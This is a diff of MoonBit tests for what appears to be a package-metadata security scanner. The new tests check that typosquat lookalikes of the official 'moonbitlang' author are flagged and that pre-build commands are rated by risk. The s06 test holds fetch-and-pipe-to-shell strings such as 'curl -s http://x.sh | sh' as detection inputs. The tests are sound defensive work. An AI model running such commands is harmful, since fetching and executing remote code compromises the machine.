@@ -4,7 +4,7 @@ fn manifest(
   repo : String,
   deps : Array[String],
 ) -> @metadata.Manifest {
-  { name, version: "0.1.0", repository: repo, readme: "README.md", deps }
+  { name, version: "0.1.0", repository: repo, readme: "README.md", deps, }
 }
 
 ///|
@@ -307,7 +307,7 @@ test "m05 exempts self-owned dependencies" {
   let fs = @metadata.m05(m, ["QuietlyChan/moonai"])
   inspect(fs.length(), content="0")
   // 他人名义的近似依赖仍然触发（≥8 字符，DL=1）
-  let m2 = { ..m, deps: ["stranger/moonbitl1"] }
+  let m2 = { ..m, deps: ["stranger/moonbitl1"], }
   let fs2 = @metadata.m05(m2, ["popular/moonbitls"])
   inspect(fs2.length(), content="1")
 }
@@ -319,7 +319,45 @@ test "m05 short-name near-misses need DL<=1" {
   let fs = @metadata.m05(m, ["QuietlyChan/moonai"])
   inspect(fs.length(), content="0")
   // 长名（≥8）维持 DL≤2：moonbitls(9) vs moonbitl1(9) DL=1 触发
-  let m2 = { ..m, deps: ["stranger/moonbitl1"] }
+  let m2 = { ..m, deps: ["stranger/moonbitl1"], }
   let fs2 = @metadata.m05(m2, ["popular/moonbitls"])
   inspect(fs2.length(), content="1")
+}
+
+///|
+test "m02 flags official author lookalikes" {
+  // moonbitlangs（+1）/ moonbltlang（换 1）：与官方 org DL≤2
+  let f1 = @metadata.m02(manifest("moonbitlangs/toolbox", "", []))
+  inspect(f1.length(), content="1")
+  inspect(f1[0].message.contains("moonbitlang"), content="true")
+  let f2 = @metadata.m02(manifest("moonbltlang/x", "", []))
+  inspect(f2.length(), content="1")
+  // 长后缀变体（-team 为 5 编辑）不触发
+  inspect(
+    @metadata.m02(manifest("moonbitlang-team/toolbox", "", [])).length(),
+    content="0",
+  )
+  // 无关作者不受影响（DL>2 或 <8 字符）
+  inspect(@metadata.m02(manifest("moonbit/core", "", [])).length(), content="1") // repo 官方名命中（原有行为）
+  inspect(
+    @metadata.m02(manifest("someuser/toolbox", "", [])).length(),
+    content="0",
+  )
+}
+
+///|
+test "s06 classifies command chains" {
+  let c = @metadata.classify_prebuild
+  let (s1, r1) = c("curl -s http://x.sh | sh")
+  inspect(s1 == Critical, content="true")
+  inspect(r1, content="pipe to sh")
+  let (s2, _) = c("echo $(whoami) > /tmp/x")
+  inspect(s2 == Critical, content="true")
+  let (s3, _) = c("curl -s http://data | base64 -d | sh")
+  inspect(s3 == Critical, content="true")
+  let (s4, _) = c("curl -sO http://example.com/data.tar")
+  inspect(s4 == High, content="true")
+  let (s5, r5) = c("embed -i d.txt")
+  inspect(s5 == High, content="true")
+  inspect(r5, content="pre-build hook")
 }
